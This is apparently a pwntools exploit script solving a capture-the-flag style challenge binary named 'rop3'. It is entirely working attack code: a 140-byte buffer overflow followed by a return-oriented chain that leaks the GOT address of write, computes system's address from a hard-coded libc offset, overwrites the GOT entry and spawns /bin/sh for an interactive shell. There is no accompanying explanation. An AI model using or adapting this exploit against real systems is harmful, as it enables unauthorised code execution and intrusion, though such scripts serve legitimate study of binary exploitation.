from pwn import *

s = process('./rop3')
e = ELF('./rop3')

pppr = 0x804855d 
offset = 0x99a80 	#write - system

payload = ""
payload += "A"*140

payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(8)

payload += p32(e.plt['write'])
payload += p32(pppr)
payload += p32(1)
payload += p32(e.got['write'])
payload += p32(4)

payload += p32(e.plt['read'])
payload += p32(pppr)
payload += p32(0)
payload += p32(e.got['write'])
payload += p32(4)

payload += p32(e.plt['write'])
payload += "AAAA"
payload += p32(e.bss())

s.sendline(payload)
s.sendline("/bin/sh")
recv = u32(s.recv(4))
print hex(recv)
s.sendline(p32(recv - offset))

s.interactive()
